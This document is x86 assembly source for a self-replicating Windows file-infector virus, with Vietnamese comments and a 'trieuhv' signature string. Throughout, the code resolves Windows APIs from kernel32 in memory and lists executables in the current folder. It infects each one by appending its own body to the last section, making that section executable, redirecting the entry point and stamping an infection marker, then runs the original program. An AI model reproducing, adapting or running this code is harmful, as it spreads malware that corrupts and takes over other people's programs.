.586p
.model FLAT, stdcall
Extern VirtualProtect@16:NEAR
_DATA segment
temp				dword ?
_DATA ends

_TEXT segment
START :
push offset temp
push 40h; EXECUTE_READWRITE
mov eax, offset END_VR
mov ebx, offset START_VR
sub eax, ebx
push eax
mov eax, offset START_VR
push eax
call VirtualProtect@16
START_VR :
call __
__:
pop eax
sub eax, offset __
mov[offset delta + eax], eax
mov esi, eax

code_ :
; lay dia chi kernel32.dll
pop eax
push eax
and eax, 0ffff0000h

find_kernel32:
cmp word ptr[eax], "ZM"
jne find_continues
mov edi, [eax + 3Ch]
add edi, eax
mov ebx, [edi]
cmp ebx, "EP"

je finded_kernel32
find_continues :
sub eax, 10000h

jmp find_kernel32
finded_kernel32 :
; eax VA of Kernel32.dll

; VA ImageBaseKernelInMem = eax
mov[VAImageBaseKernelInMem + esi], eax
; VA PEsignature = edi
mov[VAPEsignatureInMem + esi], edi

; RVA ExportTableInFile = dword prt[VA PEsignature + 78h] .. <in FILE : 78h = offset RVA Export table addess - offset PeSignature>
mov ebx, [edi + 78h]
; VA ImageBaseKernelInFile = dw ptr[VA PEsignature + 34h]  .. <in FILE : 34h = offset ImageBase - offset PeSignature>
mov ecx, [edi + 34h]
; offset ImageBase = VA ImageBaseKernelInMem - VA ImageBaseKernelInFile
sub eax, ecx
; VA ExportTableInMem = RVA ExportTableInFile + VA ImageBaseInFile + offset ImageBase
add ebx, ecx
add ebx, eax; ebx = VAExportTable

; ------read "Export table" of kernel to find "LoadLibrary"---------------- -
; read dword in position 9 = ENT->find function by name
mov[VAExportTable + esi], ebx
mov edi, ebx

mov ebx, [edi + 28]
add ebx, [VAImageBaseKernelInMem + esi]
mov[VAEAT + esi], ebx; save VA EAT table
mov ebx, [edi + 32]
add ebx, [VAImageBaseKernelInMem + esi]
mov[VAENT + esi], ebx; save VA ENT table
mov ebx, [edi + 36]
add ebx, [VAImageBaseKernelInMem + esi]
mov[VAEOT + esi], ebx; save VA EOT table

mov eax, [VAENT + esi]
sub eax, 4
mov edx, [VAEOT + esi]
sub edx, 2
whileFindFuncName:
add edx, 2
add eax, 4
mov ebx, [eax]; ebx = RVA of 1 Name function
add ebx, [VAImageBaseKernelInMem + esi]; ->ebx point to VA Name function export
mov ecx, [ebx]

cmp ecx, "PteG"
je find_continues1
jmp whileFindFuncName
find_continues1 :
mov ecx, [ebx + 4]
cmp ecx, "Acor"
je find_continues2
jmp whileFindFuncName
find_continues2 :
mov ecx, [ebx + 8]
cmp ecx, "erdd"
je find_continues3
jmp whileFindFuncName
find_continues3 :
xor ecx, ecx
mov cx, word ptr[ebx + 12]
cmp cx, "ss"
je break_FindFuncName
jmp whileFindFuncName

break_FindFuncName :
mov cx, word ptr[edx]

mov edx, [VAEAT + esi]
while_findAddr :
add edx, 4
loop while_findAddr
mov edx, [edx]
add edx, [VAImageBaseKernelInMem + esi]
mov[func_GetProcAddress + esi], edx

; set func_LoadLibrary
mov eax, offset LoadLibraryA
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_LoadLibraryA + esi], eax

; set func_VirtualProtect
mov eax, offset VirtualProtect
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_VirtualProtect + esi], eax

; load dll _ user32.dll
mov eax, offset user32
add eax, esi
push eax
call[func_LoadLibraryA + esi]
mov[dll_user32 + esi], eax

; set func_MessageBoxA
mov eax, offset MessageBoxA
add eax, esi
push eax
push[dll_user32 + esi]
call[func_GetProcAddress + esi]
mov[func_MessageBoxA + esi], eax

; set func_CreateFile
mov eax, offset name_CreateFile
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_CreateFile + esi], eax

; set func_ReadFile
mov eax, offset name_ReadFile
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_ReadFile + esi], eax

; set func_WriteFile
mov eax, offset WriteFile
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_WriteFile + esi], eax

; set func_SetFilePointer
mov eax, offset SetFilePointer
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_SetFilePointer + esi], eax

; set func_CloseHandle
mov eax, offset CloseHandle
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_CloseHandle + esi], eax

; set func_CloseHandle
mov eax, offset lstrcmp
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_lstrcmp + esi], eax

; set func_FindFirstFileA
mov eax, offset FindFirstFileA
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_FindFirstFileA + esi], eax

; set func_FindNextFileA
mov eax, offset FindNextFileA
add eax, esi
push eax
push[VAImageBaseKernelInMem + esi]
call[func_GetProcAddress + esi]
mov[func_FindNextFileA + esi], eax
;inject
push[oldEnTryPoint + esi]
push[newEP + esi]
call searchFile
pop[newEP + esi]
pop[oldEnTryPoint + esi]
push 30h
mov eax, offset trieu
add eax, esi
push eax
mov eax, offset msg
add eax, esi
push eax
push 0
call[func_MessageBoxA + esi]
cmp esi, 0
je	end_

mov eax, offset START_VR - offset end_ + 5
add eax, [oldEnTryPoint + esi]
sub eax, [newEP + esi]
call delta_callback
delta_callback :
pop ebx
add ebx, eax
push ebx
ret
end_ :

ret
searchFile proc
push esi
push eax
push ebx
push ecx
push edx

mov eax, offset FindData
add eax, esi
push eax
mov eax, offset PathFile
add eax, esi
push eax
call[func_FindFirstFileA + esi]
mov[hFindFile + esi], eax
jmp fileFirst

whileFindFile :
mov eax, offset FindData
add eax, esi
push eax
push[hFindFile + esi]
call[func_FindNextFileA + esi]

cmp eax, 0
je breakFindFile
fileFirst :
cmp dword ptr[FindData + esi], 10h
je  whileFindFile; dwAttributes = 10h->folder
cmp dword ptr[FindData + esi], 20h
jne noFile; dwAttributes = 10h->file

call inject

noFile :

jmp whileFindFile
breakFindFile :

popad

ret

searchFile endp
inject proc

pushad
push 0
push 20h
push 3
push 0
push 1
push 0C0000000h
mov eax, offset FindData + 44; ten file lay nhiem
add eax, esi
push eax
call[func_CreateFile + esi]
mov[hFile + esi], eax
cmp eax, -1
je ketThuc_layNhiem
mov[HostSignature + esi], 0
push 0; Overlapped
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 2; numOfByte to read
mov eax, offset HostSignature
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]

mov eax, 0
mov ax, word ptr[offset HostSignature + esi]
cmp eax, 5a4dh
jne ketThuc_layNhiem

;sua Header file lay nhiem
mov[szShellcode + esi], offset END_VR - offset START_VR

push 0
push 0
push 3ch
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 4; numOfByte to read
mov eax, offset PESignatureHost
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]

;kiem tra chu ki "PE" + VR Signature
push 0
push 0
push[PESignatureHost + esi]
push[hFile + esi]
call[func_SetFilePointer + esi]

mov[HostSignature + esi], 0
push 0; Overlapped
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 4; numOfByte to read
mov eax, offset HostSignature
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]
cmp dword ptr[HostSignature + esi], "EP"
jne ketThuc_layNhiem

push 2
push 0
push - 15
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0; Overlapped
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 14; numOfByte to read
mov eax, offset HostSignature
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]

mov eax, offset HostSignature
add eax, esi
push eax
mov eax, offset trieu
add eax, esi
push eax
call[func_lstrcmp + esi]
je ketThuc_layNhiem
;read Section Alignment + File Alignment
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 38h
push eax
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0; Overlapped
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 8; numOfByte to read
mov eax, offset SectionAlignment
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]

;read EntryPoint Host
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 28h
push eax
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0; Overlapped
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 4; numOfByte to read
mov eax, offset oldEnTryPoint
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]

;read ImageSize Host
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 50h
push eax
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0; Overlapped
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 4; numOfByte to read
mov eax, offset ImageSizeHost
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]


;read Number of Section
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 6h
push eax
push[hFile + esi]
call[func_SetFilePointer + esi]

mov[NumberOfSection + esi], 0
push 0; Overlapped
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 2; numOfByte to read
mov eax, offset NumberOfSection
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]

;change Section final
mov ecx, [NumberOfSection + esi]
dec ecx
mov eax, [PESignatureHost + esi]
add eax, 0f8h + 8
lap_1:
add eax, 40
loop lap_1

push 0
push 0
push eax
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0; Overlapped
mov eax, offset numOfByteRead
add eax, esi
push eax; offset mumByteReaded
push 32; numOfByte to read
mov eax, offset VirtualSize
add eax, esi
push eax; offset Buff save
push[hFile + esi]; hFile to Read
call[func_ReadFile + esi]

; ------calculate new RawSize + Virtual size + characteristic------ -
mov[Characteristics + esi], 0E0000040h; set is exe + write + read

mov eax, [szShellcode + esi];
add[RawSize + esi], eax; rawsize += Virus size
; raw size is not FileAlignment
mov eax, [RawSize + esi];
mov edx, 0
div[FileAlignment + esi]; edx = phan du, eax = thuong

mov eax, [FileAlignment + esi]
sub eax, edx
add[RawSize + esi], eax; eax = num of file to fill
mov[numOfByteToFill + esi], eax

mov eax, [RawSize + esi]
mov[VirtualSize + esi], eax

push 1; jump to in front of section final
push 0h
push - 32
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0; write to Section header
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 32
mov eax, offset VirtualSize
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]

push 2
push 0
push 0
push[hFile + esi]
call[func_SetFilePointer + esi]

mov ebx, [RawSize + esi]
add ebx, [RawAddress + esi]
cmp	eax, ebx
je fullAlignment
fullAlignment :
;ghi entry point
push 2
push 0
push 0
push[hFile + esi]
call[func_SetFilePointer + esi]
mov[szFile + esi], eax
sub eax, [RawAddress + esi]
add eax, [VirtualAddress + esi]
mov[newEP + esi], eax

push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 28h
push eax
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 4
mov eax, offset newEP
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]

;ghi Image size file
push 0
push 0
mov eax, [PESignatureHost + esi]
add eax, 50h
push eax
push[hFile + esi]
call[func_SetFilePointer + esi]

mov eax, [VirtualAddress + esi]
add eax, [VirtualSize + esi]
cmp eax, [ImageSizeHost + esi]

jle not_write

mov eax, [ImageSizeHost + esi]
add eax, [SectionAlignment + esi]
mov[ImageSizeVr + esi], eax

push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 4
mov eax, offset ImageSizeVr
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]

not_write:
;ghi shell vao cuoi file
push 2
push 0
push 0
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
mov eax, offset END_VR
mov ebx, offset START_VR
sub eax, ebx
push eax
mov eax, offset START_VR
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]

;fill byte 00
mov ecx, [numOfByteToFill + esi]
lap_fill:
push ecx
push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 1
mov eax, offset byteFill
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]
pop ecx
loop lap_fill

;chu ky
push 2
push 0
push - 15
push[hFile + esi]
call[func_SetFilePointer + esi]

push 0
mov eax, offset numOfByteWritten
add eax, esi
push eax
push 15
mov eax, offset trieu
add eax, esi
push eax
push[hFile + esi]
call[func_WriteFile + esi]

ketThuc_layNhiem:
push[hFile + esi]
call[func_CloseHandle + esi]

pop edx
pop ecx
pop ebx
pop eax
pop esi
ret

inject endp

data_ :
byteFill			db		0
msg					db		"Lay nhiem thanh cong", 0
delta				dword ?
func_GetProcAddress	dword ?

user32			db		"user32.dll", 0
dll_user32 			dword ?
MessageBoxA 	db 		"MessageBoxA", 0
func_MessageBoxA 	dword ?
LoadLibraryA	db 		"LoadLibraryA", 0
func_LoadLibraryA	dword ?
VirtualProtect	db		"VirtualProtect", 0
func_VirtualProtect	dword ?
name_CreateFile		db		"CreateFileA", 0
func_CreateFile		dword ?
name_ReadFile		db		"ReadFile", 0
func_ReadFile		dword ?
WriteFile		db		"WriteFile", 0
func_WriteFile		dword ?
SetFilePointer	db		"SetFilePointer", 0
func_SetFilePointer	dword ?
CloseHandle	db		"CloseHandle", 0
func_CloseHandle	dword ?
lstrcmp		db		"lstrcmp", 0
func_lstrcmp		dword ?
FindFirstFileA	db		"FindFirstFileA", 0
func_FindFirstFileA	dword ?
FindNextFileA	db		"FindNextFileA", 0
func_FindNextFileA	dword ?

VAImageBaseKernelInMem		dword ?
VAPEsignatureInMem			dword ?
VAExportTable			dword ?
VAEAT						dword ?
VAENT						dword ?
VAEOT						dword ?


szShellcode					dword ?
szFile					dword ?

hFile					dword ?
PESignatureHost				dword ?
ImageSizeHost				dword ?
ImageSizeVr					dword ?
oldEnTryPoint				dword ?
newEP				dword ?
NumberOfSection				dword ?
SectionAlignment			dword ?
FileAlignment				dword ?
VirtualSize					dword ?
VirtualAddress				dword ?
RawSize						dword ?
RawAddress					dword ?
Free						db 		12 dup(? )
Characteristics				dword ?
numOfByteToFill				dword ?
numOfByteWritten			dword ?
numOfByteRead				dword ?

hFindFile					dword ?
PathFile					db 		".\*.*", 50 dup(0)
FindData					db 		592 dup(? ), 0

HostSignature				db		15 dup(0)
trieu					db		"trieuhv", 0
END_VR :
	_TEXT ends
	END START